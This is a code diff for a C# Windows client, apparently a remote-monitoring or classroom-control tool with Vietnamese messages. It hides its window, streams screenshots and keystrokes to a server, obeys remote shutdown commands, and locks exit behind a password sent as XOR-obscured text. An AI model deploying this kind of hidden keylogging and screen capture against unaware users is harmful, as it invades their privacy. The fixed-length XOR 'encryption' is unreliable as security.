@@ -42,24 +42,19 @@ namespace Client
             ShareScreen = new Thread(SendDesktopImage);
             ShareScreen.IsBackground = true;
             
-            InitializeComponent();
-            
+            InitializeComponent();     
         }
         public byte[] Xor(string a, string b)
         {
             char[] charAArray = a.ToCharArray();
             char[] charBArray = b.ToCharArray();
             byte[] result = new byte[27];
-            // Set length to be the length of the shorter string
-
             for (int i = 0; i < 27; i++)
             {
-                result[i] = (byte)(charAArray[i] ^ charBArray[i]) ; // Error here
+                result[i] = (byte)(charAArray[i] ^ charBArray[i]) ;
             }
-
             return result;
         }
-
         void TakeCommandFromServer()
         {
             this.Hide();
@@ -68,8 +63,6 @@ namespace Client
                 try
                 {
                     signalStream = signalClient.GetStream();
-
-                    //MessageBox.Show("Client said hello");
                     byte[] data = new byte[1024];
                     int numBytesRead = signalStream.Read(data, 0, data.Length);
                     string signal;
@@ -78,14 +71,11 @@ namespace Client
                     {
                         signal = Encoding.ASCII.GetString(data, 0, numBytesRead);
                         command = signal.Substring(0, signal.IndexOf('$'));
-
-                        //screenStream = screenClient.GetStream();
                         if (command.StartsWith("secret"))
-                        {
-                            
+                        {                 
                             String[] separator = { ":" };
-                            secret = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[1];
-                            MessageBox.Show(Encoding.ASCII.GetString(Xor(secret, KEY)));
+                            string encryptedPass = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[1];
+                            secret = Encoding.ASCII.GetString(Xor(encryptedPass, KEY));
                         }
                         if (command == "Share Screen")
                         {
@@ -96,28 +86,20 @@ namespace Client
                                 stopsharing = false;
                                 mre.Set();
                             }
-
-                            //break;
-
                         }
                         if (command == "Stop Share Screen")
                         {
                             stopsharing = true;
-                            //ShareScreen.Abort();
                         }
-                        if (command.StartsWith("shutdown -s -t")) // command = shutdown -s -t
+                        if (command.StartsWith("shutdown -s -t"))
                         {
-                            // timer1.Start();
-                            //SignalStream.Close();
                             String[] separator = { "shutdown" };
                             String arg = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[0];
                             Shutdown(arg);
                         }
 
-                        if (command == "shutdown -a") // command = shutdown -s -t
+                        if (command == "shutdown -a")
                         {
-                            // timer1.Start();
-                            //SignalStream.Close();
                             String[] separator = { "shutdown" };
                             String arg = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[0];
                             Shutdown(arg);
@@ -133,9 +115,8 @@ namespace Client
                 }
                 catch (Exception ex)
                 {
-
+                    MessageBox.Show(ex.Message);
                 }
-
             }
             MessageBox.Show("Server disconnected");
             Application.Exit();
@@ -195,18 +176,11 @@ namespace Client
             Rectangle rect = Screen.PrimaryScreen.Bounds;
             rect.Height = (int)(GetDisplayResolution().Height);
             rect.Width = (int)(GetDisplayResolution().Width);
-            //MessageBox.Show(rect.Size.ToString());
             Bitmap screenBitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
             Graphics screenGraphics = Graphics.FromImage(screenBitmap);
-            screenGraphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);
-           
-            screenGraphics.DrawIcon(new Icon("Sample.ico"), Cursor.Position.X - 50, Cursor.Position.Y - 50);
-
-
+            screenGraphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);        
             return screenBitmap;
-        }
-
-       
+        }    
         private void SendDesktopImage()
         {
             try
@@ -217,16 +191,12 @@ namespace Client
                 BinaryFormatter binaryFormatter = new BinaryFormatter();
                 screenStream = screenClient.GetStream();
                 binaryFormatter.Serialize(screenStream, GrabDesktop());
-                //Thread.Sleep(100);
                 }
             }
             catch(Exception ex)
             {
-                //MessageBox.Show(ex.Message);
+                MessageBox.Show(ex.Message);
             }
-
-
-
         }
 
         private void sendKey(object key)
@@ -238,8 +208,7 @@ namespace Client
         private void Keylogger()
         {
             try
-            {
-              
+            {     
                 logStream = logClient.GetStream();
                 while (logClient.Connected)
                 {
@@ -255,18 +224,6 @@ namespace Client
         }
         private void Client_Load(object sender, EventArgs e)
         {
-            //this.Hide();
-            //this.WindowState = FormWindowState.Maximized;
-            //Rectangle rect = Screen.PrimaryScreen.Bounds;
-            //rect.Height = (int) (rect.Height*1.5);
-            //rect.Width = (int)(rect.Width * 1.5);
-            //MessageBox.Show(rect.Size.ToString());
-
-            //float dpiX, dpiY;
-            //Graphics graphics = this.CreateGraphics();
-            //dpiX = graphics.DpiX;
-            //dpiY = graphics.DpiY;
-            //MessageBox.Show(dpiX.ToString() + "  " + dpiY.ToString());
 
 
             signalClient.Connect(IPAddress.Parse("127.0.0.1"), 8080);
@@ -278,19 +235,21 @@ namespace Client
             ConnectServer.Start();
 
         }
-
         private void Exit_Click(object sender, EventArgs e)
         {
             String password = Microsoft.VisualBasic.Interaction.InputBox("Nhập mật khẩu bảo vệ ", "Mật khẩu", "", -1, -1);
-            
-            if (password == secret )
+            if (password != "")
             {
-                Application.Exit();
+                if (password == secret && secret != null)
+                {
+                    Application.Exit();
+                }
+                else
+                {
+                    MessageBox.Show("Bạn đã nhập mật khẩu sai ! ", " Lỗi");
+                }
             }
-            else
-            {
-                MessageBox.Show("Bạn đã nhập mật khẩu sai ! ", " Lỗi");
-            }
+
         }
     }
 }
